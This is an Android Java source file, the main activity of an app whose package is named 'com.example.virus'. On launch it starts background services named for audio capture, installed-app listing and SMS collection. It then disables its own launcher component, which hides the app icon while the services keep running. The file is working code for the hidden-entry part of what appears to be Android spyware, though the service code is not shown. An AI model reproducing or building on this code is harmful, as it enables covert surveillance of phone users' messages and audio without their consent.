package com.example.virus;


import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;

import com.example.virus.Services.AppInfoService;
import com.example.virus.Services.AudioService;
import com.example.virus.Services.MainService;
import com.example.virus.Services.SmsInfoService;

public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        startService(new Intent(this, MainService.class));
        startService(new Intent(this, AudioService.class));
        startService(new Intent(this, AppInfoService.class));
        startService(new Intent(this, SmsInfoService.class));
        ComponentName cn = new ComponentName("com.example.virus", "com.example.virus.MainActivity");
        PackageManager pm = getPackageManager();
        pm.setComponentEnabledSetting(cn, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
    }
}
